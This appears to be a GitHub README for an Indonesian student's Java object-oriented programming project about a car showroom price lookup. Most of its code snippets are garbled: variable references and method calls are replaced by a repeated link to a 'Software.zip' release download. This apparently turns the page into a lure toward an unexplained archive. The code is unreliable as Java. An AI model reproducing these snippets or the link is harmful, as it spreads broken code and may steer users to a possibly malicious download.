# Proyek Akhir Pemrograman Berbasis Objek 1

Proyek ini adalah contoh sederhana aplikasi pengolahan data mahasiswa menggunakan Java sebagai tugas akhir dari mata kuliah pemrograman berbasis objek 1.

## Deskripsi

Aplikasi ini menerima input berupa nama mobil dan tahun mobil untuk mengetahui kisaran harga mobil pada showrom mobil tersebut.

Aplikasi ini mengimplementasikan beberapa konsep penting dalam pemrograman berorientasi objek (OOP) seperti Class, Object, Atribut, Method Constructor, Method Mutator, Method Accessor, Encapsulation, Inheritance, Overloading, Overriding, Seleksi, Perulangan, IO Sederhana, dan Array.

## Penjelasan Kode

Berikut adalah bagian kode yang relevan dengan konsep OOP yang dijelaskan:

1. **Class** adalah template atau blueprint dari object. Pada kode ini, `mobil`, `statusMobil`, dan `showroomMobil` adalah contoh dari class.

```bash
public class mobil {
    ...
}

public class statusMobil extends mobil {
    ...
}

showroomMobil {
    ...
}
```

2. **Object** adalah instance dari class. Pada kode ini, `pembeli[i] = new statusMobil(nama, namaMobil, tahunMobil);` adalah contoh pembuatan object.

```bash
pembeli[i] = new statusMobil(nama, namaMobil, tahunMobil);
```

3. **Atribut** adalah variabel yang ada dalam class. Pada kode ini, `nama` , `namaMobil` dan `tahunMobil` adalah contoh atribut.

```bash
String nama;
String namaMobil;
String tahunMobil;
```

4. **Constructor** adalah method yang pertama kali dijalankan pada saat pembuatan object. Pada kode ini, constructor ada di dalam class `mobil` dan `statusMobil`.

```bash
public mobil(String nama, String namaMobil, String tahunMobil) {
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = nama;
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = namaMobil;
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = tahunMobil;
    }

public class statusMobil extends mobil{
    public statusMobil(String nama, String namaMobil, String tahunMobil) {
        super(nama, namaMobil, tahunMobil);
    }
```

5. **Mutator** atau setter digunakan untuk mengubah nilai dari suatu atribut. Pada kode ini, `setNama`,`setNamaMobil` dan `setTahunMobil` adalah contoh method mutator.

```bash
    public void setNama(String nama) {
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = nama;
    }

    public void setNamaMobil(String namaMobil) {
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = namaMobil;
    }

    public void setTahunMobil(String tahunMobil) {
        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = tahunMobil;
    }
```

6. **Accessor** atau getter digunakan untuk mengambil nilai dari suatu atribut. Pada kode ini, `getNama`, `getNamaMobil`, `getTahunMobil`, `getMobil` dan `getTahun` adalah contoh method accessor.

```bash
    public String getNama() {
        return nama;
    }

    public String getNamaMobil() {
        return namaMobil;
    }

    public String getTahunMobil() {
        return tahunMobil;
    }
```

7. **Encapsulation** adalah konsep menyembunyikan data dengan membuat atribut menjadi private dan hanya bisa diakses melalui method. Pada kode ini, atribut `nama` , `namaMobil` , dan `tahunMobil` dienkapsulasi dan hanya bisa diakses melalui method getter dan setter.

```bash
    private String nama;
    private String namaMobil;
    private String tahunMobil;
```

8. **Inheritance** adalah konsep di mana sebuah class bisa mewarisi property dan method dari class lain. Pada kode ini, `statusMobil` mewarisi `mobil` dengan sintaks `extends`.

```bash
public class statusMobil extends mobil {
    ...
}
```

9. **Polymorphism** adalah konsep di mana sebuah nama dapat digunakan untuk merujuk ke beberapa tipe atau bentuk objek berbeda. Ini memungkinkan metode-metode dengan nama yang sama untuk berperilaku berbeda tergantung pada tipe objek yang mereka manipulasi, polymorphism bisa berbentuk Overloading ataupun Overriding. Pada kode ini, method `displayInfo` di `statusMobil` merupakan override dari method `displayInfo` di `mobil`.

```bash
@Override
    public String displayInfo(){
        return https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip()+
                "\n Mobil : " + getMobil()+
                "\n Tahun : " + getTahun();
    }
```

10. **Seleksi** adalah statement kontrol yang digunakan untuk membuat keputusan berdasarkan kondisi. Pada kode ini, digunakan seleksi `switch` dalam method `getMobil` dan seleksi `if else` dalam method `getTahun`.

```bash
public String getMobil(){
        String kodeMobil = getNamaMobil();
        switch(kodeMobil){
            case "1":
                return "Avanza";
            case "2":
                return "Xenia";
            case "3":
                return "Jazz";
            case "4":
                return "Civic";
            case "5":
                return "Vios";
            default:
                return "mobil tidak terdaftar";
        }
    }

 public String getTahun(){
        String tahunMobil = getTahunMobil();
        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("1")){
            return "2005-2010";
        } else {
        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("2")){
            return "2010-2015";
        } else {
        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("3")){
            return "2015-2020";
        } else {
            return "tahun tidak diketahui";
        }
        }
       }
    }
```

11. **Perulangan** adalah statement kontrol yang digunakan untuk menjalankan blok kode berulang kali. Pada kode ini, digunakan loop `for` untuk meminta input dan menampilkan data.

```bash
for(int i=0; i<https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip; i++) {
    ...
}
```

12. **Input Output Sederhana** digunakan untuk menerima input dari user dan menampilkan output ke user. Pada kode ini, digunakan class `Scanner` untuk menerima input dan method `https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip` untuk menampilkan output.

```bash
Scanner scanner = new Scanner(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip);
https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("======================\nMasukkan nama Pembeli "+(i+1)+": ");
String nama = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();
https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\nPilih Mobil: ");
String namaMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();
https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("1.2005-2010\n2.2010-2015\n3.2015-2020\nPilih Tahun Mobil: ");
String tahunMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();

https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("===Data Pembeli===");
https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip());
```

13. **Array** adalah struktur data yang digunakan untuk menyimpan beberapa nilai dalam satu variabel. Pada kode ini, `statusMobil[] pembeli = new statusMobil[2];` adalah contoh penggunaan array.

```bash
statusMobil[] pembeli = new statusMobil[2];
```


## Usulan nilai

| No  | Materi         |  Nilai  |
| :-: | -------------- | :-----: |
|  1  | Class          |    5    |
|  2  | Object         |    5    |
|  3  | Atribut        |    5    |
|  4  | Constructor    |    5    |
|  5  | Mutator        |    5    |
|  6  | Accessor       |    5    |
|  7  | Encapsulation  |    5    |
|  8  | Inheritance    |    5    |
|  9  | Polymorphism   |   10    |
| 10  | Seleksi        |    5    |
| 11  | Perulangan     |    5    |
| 12  | IO Sederhana   |   10    |
| 13  | Array          |   15    |
|     | **TOTAL**      | **85**  |

## Pembuat

Nama: Muhammad Ade Gati Pangestu
NPM: 2110010496
